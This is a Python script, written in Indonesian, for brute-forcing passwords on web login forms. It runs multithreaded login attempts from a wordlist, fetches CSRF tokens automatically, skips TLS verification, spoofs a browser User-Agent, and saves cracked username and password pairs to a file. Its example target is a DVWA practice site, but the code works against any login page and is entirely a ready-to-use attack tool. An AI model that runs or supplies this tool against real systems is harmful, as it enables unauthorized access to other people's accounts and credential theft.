import requests
from bs4 import BeautifulSoup
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import sys
import argparse
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
found_accounts = []
lock = threading.Lock()
total_attempts = 0
attempts_lock = threading.Lock()
stop_event = threading.Event()

def check_login(url, username, password, token_name):
    global total_attempts
    if stop_event.is_set():
        return False
    pw = password.strip()
    if not pw:
        return False
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Referer': url
    })

    try:
        r1 = session.get(url, verify=False, timeout=10)
        soup = BeautifulSoup(r1.text, 'html.parser')
        payload = {'username': username, 'password': pw}
        if token_name:
            token_input = soup.find('input', {'name': token_name})
            if token_input and 'value' in token_input.attrs:
                payload[token_name] = token_input['value']
        r2 = session.post(url, data=payload, verify=False, timeout=10, allow_redirects=True)
        success_indicators = ["logout", "keluar", "dashboard", "welcome", "berhasil", "admin", username]
        is_success = any(indicator in r2.text.lower() for indicator in success_indicators)
        is_error = "gagal" in r2.text.lower() or "error" in r2.text.lower() or "invalid" in r2.text.lower() or "loginerrormessage" in r2.text.lower()

        with attempts_lock:
            total_attempts += 1
        if is_success and not is_error:
            account_info = f"User: {username} | PASS: {pw}"
            with lock:
                found_accounts.append(account_info)
                print(f"\nBerhasil ditemukan: {account_info}")
                with open("hasil_bruteforce.txt", "a") as f:
                    f.write(f"{account_info}\n")
            stop_event.set() 
            return True   
        else:
            return False
            
    except Exception:
        with attempts_lock:
            total_attempts += 1
        return False
def brute_user(url, username, passwords, threads, token_name):
    stop_event.clear() 
    print(f"Memproses user: {username} ({len(passwords)} password)")
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_login, url, username, pw, token_name): pw for pw in passwords}
        for future in as_completed(futures):
            if future.result():
                for f in futures:
                    f.cancel()
                break 
    print(f"Selesai memproses user: {username}")

def main():
    parser = argparse.ArgumentParser(description="Advanced POST Brute Force Tool with Token Support")
    parser.add_argument("-u", "--url", required=True, help="Target URL login (contoh: http://dvwa.hackme.biz.id:8080/login.php)")
    parser.add_argument("-w", "--wordlist", required=True, help="Path ke file wordlist password")
    parser.add_argument("-U", "--users", nargs='+', required=True, help="Daftar username (contoh: -U admin budi jessica)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Jumlah threads (default: 10)")
    parser.add_argument("--token", default="logintoken", help="Nama input token CSRF (default: logintoken. Kosongkan jika tidak ada)")
    
    args = parser.parse_args()
    print(f"Target: {args.url}")
    print(f"Users: {', '.join(args.users)}")
    print(f"Waktu Mulai: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    try:
        with open(args.wordlist, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
        print(f"[*] Loaded {len(passwords)} passwords")
        print(f"[*] Total percobaan: {len(passwords) * len(args.users)} request")
        
        open("hasil_bruteforce.txt", "w").close()
        for user in args.users:
            brute_user(args.url, user, passwords, args.threads, args.token)
        print("Ringkasan hasil")

        if found_accounts:
            print(f"Ditemukan {len(found_accounts)} akun:")
            for acc in found_accounts:
                print(f"{acc}")
        else:
            print("Tidak ada akun yang berhasil ditemukan.")
            
        print(f"Total percobaan nyata: {total_attempts}")
        print(f"Waktu Selesai: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("[Hasil disimpan di file: hasil_bruteforce.txt")
            
    except FileNotFoundError:
        print(f"File {args.wordlist} tidak ada!")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\nProgram dihentikan oleh user.")
        if found_accounts:
            with open("hasil_bruteforce.txt", "a") as f:
                for acc in found_accounts:
                    f.write(f"{acc}\n")
        sys.exit(1)
if __name__ == "__main__":
    main()